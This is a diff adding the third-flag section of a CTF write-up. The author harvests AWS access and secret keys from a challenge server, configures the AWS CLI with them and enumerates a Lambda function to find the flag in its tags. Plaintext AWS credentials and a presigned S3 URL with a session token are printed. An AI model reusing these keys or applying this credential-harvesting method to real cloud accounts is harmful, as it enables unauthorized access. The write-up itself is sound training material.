@@ -138,6 +138,98 @@ That was my 2nd flag.
 
 
 
+## Third Flag
+
+```
+Challenge 3
+
+Rehana used serverless technology to publish her website. She set some values for multiple project.
+Find some interesting values.
+```
+
+I have retrived server files content with the help of python script. Now, again I used that with some changes to find the AWS access credentials. I send request to all URls and print them on terminal. Also use grep command to find the "Access Key" string from terminal output.
+
+<kbd>![alt text](images/16.png)</kbd>
+
+Bingoo !!!
+
+```
+root@muzzy:~# python3 ctf.py | grep "Access Key" -A 1
+    Access Key : AKIAQIZGSICKX6Y4MANS 
+    Secret Key : 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
+root@muzzy:~#
+```
+
+I found the AWS Access Key and Secret Key. Now I need to configure the AWS CLI with this credentials for access the bucket. I finally has reached so far for exploitaing the AWS bucket.
+
+```
+root@muzzy:~# aws configure
+AWS Access Key ID [None]: AKIAQIZGSICKX6Y4MANS
+AWS Secret Access Key [None]: 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
+Default region name [None]: ap-south-1
+Default output format [None]: 
+```
+
+<kbd>![alt text](images/17.png)</kbd>
+
+As we know, User has been using Serverless bucket and one of the most popular bucket is AWS Lambda.
+
+> AWS Lambda is an event-driven, serverless computing platform provided by Amazon as a part of Amazon Web Services. It is a computing service that runs code in response to events and automatically manages the computing resources required by that code. You can use AWS Lambda to extend other AWS services with custom logic, or create your own back-end services that operate at AWS scale, performance, and security.
+
+> AWS Lambda is a compute service that lets you run code without provisioning or managing servers. AWS Lambda executes your code only when needed and scales automatically, from a few requests per day to thousands per second.
+
+Regarding this I read entire documentation from "https://docs.aws.amazon.com/cli/latest/reference/lambda/". I run some commands and get below output.
+
+<kbd>![alt text](images/18.png)</kbd>
+
+```
+"FunctionName": "websitebackup"
+```
+
+Bucket has one function named "websitebackup" which I found interesting.
+
+There are many AWS CTF challanges in which we find flag within functions. So I did learn commands from "https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function-configuration.html" and get the configuration details from aws.
+
+<kbd>![alt text](images/19.png)</kbd>
+
+```
+root@muzzy:~# aws lambda get-function --function-name websitebackup
+{
+    "Code": {
+        "RepositoryType": "S3", 
+        "Location": "https://awslambda-ap-s-1-tasks.s3.ap-south-1.amazonaws.com/snapshots/018871369877/websitebackup-f6af606a-e5ce-4456-aa12-467963b722e6?versionId=dxbbWzGFGoGxrGkaDtzQ79mKtCx_50G4&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCmFwLXNvdXRoLTEiRjBEAiAg9K78qVoiaxbzTtBO48v%2BHwfYdhyOiYmNxz%2FXOs%2F26AIgUUWj0V4vdjqV%2BxKWUwIbKQilI%2F%2BoFMKjDvS0i1ST%2FkwqvwMIuv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw1NDUyNTUyMDEzMDciDMV%2BtcppfXM6ZShFSCqTA0gFfX9Sp5dfwVzCSJ7Z%2BG2gdKK5hSQLDLMEFHcZahsCetleGJPD5Gj62oJWIftJoMoD0x04jeokuD2aKv8RtjuaS%2BsD4cQMIMhvR8o7vEhLCvQFK7X14I6QQCFhgnBBZHa3Mmm0fh79Lc%2BiHYAlu0moV92rCn0J%2BeknlqGEowCeNw%2F7LfStv58QQiBrizd%2F%2Br%2BnpxHM%2FwYX8cSyFGVjNgq%2BCGOXE2QBCqzkRRvvDQmwie90oeJP58%2F3h4vkKTxlsBJEbzoDoVScP6LIO52IuWjHKWuddQKbSca%2Fk%2FlOUi2EXkH%2F1abQQWF1wx95CaJ%2F7JIpHBLgJRa7WmQHJQYNO2V6hpKUYwzgroVXLmINWx%2FFt1knSe4OpRc3T%2FMYC80Y0cOA1q1Ivdb%2FiK%2BPwrcYTV%2F2HvvG5iGC%2F6%2Fvv3y7AXT7xM%2Bhddt1he%2Fjcf4osi9WM1j0aL4A6lvElQ3r%2BsKXsQtzEB50nxOYepwu3XlF9MQaYVFPcNU5LyYplwxMZoLOh%2BqwucRLvZx8L3XHhFm5cAAvMmgwod7e%2BQU67AF3KEbaUcmKOSXNrrx%2Fr5QZIm10ic8Z1vEJHx%2FURwa%2BVss4V9aiPvstpItPnJABvLZ5n6piTdCuDwGlKVe5IUDNJ1%2FdWdihM%2FjIbb83C82AwIq6e1A%2B99jM8p%2Fr0V%2FCyWr5D5TQtgAcbRm5xuRvaiLZ4CH3bpJilb8LyYEAoxcEIm7WpnJGTzxFsPx%2Bw%2F5lAWeo9seLBHuHg6I8gUEn9VokB%2FNsqnnfYunutBu9BVuih5qRqosBntdHb6OzgHaNR2iQ514qJ3c2Fi6mPeOG7NFmtSthwJegYilR0PKzRNmQy0RrPZUntYllXVZCGw%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20200815T103058Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAX5456DIN6D6DCCGT%2F20200815%2Fap-south-1%2Fs3%2Faws4_request&X-Amz-Signature=92c7e1ac2db30b4cd3c2c8c4cebb0ecaabd9824821815104b4ba02890c043718"
+    }, 
+    "Configuration": {
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        }, 
+        "Version": "$LATEST", 
+        "CodeSha256": "vLje7sZloPikmGIHGO22ePKqHjnPXyDI5mj3wmL+Afg=", 
+        "FunctionName": "websitebackup", 
+        "LastUpdateStatus": "Successful", 
+        "MemorySize": 128, 
+        "RevisionId": "4480402d-5a23-4df6-b6c2-dfa11fca4cfd", 
+        "CodeSize": 14041922, 
+        "FunctionArn": "arn:aws:lambda:ap-south-1:018871369877:function:websitebackup", 
+        "State": "Active", 
+        "Handler": "lambda_function.lambda_handler", 
+        "Role": "arn:aws:iam::018871369877:role/service-role/websitebackup-role-mxbomdo3", 
+        "Timeout": 3, 
+        "LastModified": "2020-08-13T07:04:16.231+0000", 
+        "Runtime": "python3.6", 
+        "Description": ""
+    }, 
+    "Tags": {
+        "flag": "nsctf S3rverless_T3chnology"
+    }
+}
+```
+
+Gochaa!!!!
+
+<kbd>![alt text](images/20.png)</kbd>
+
+
 
 
 
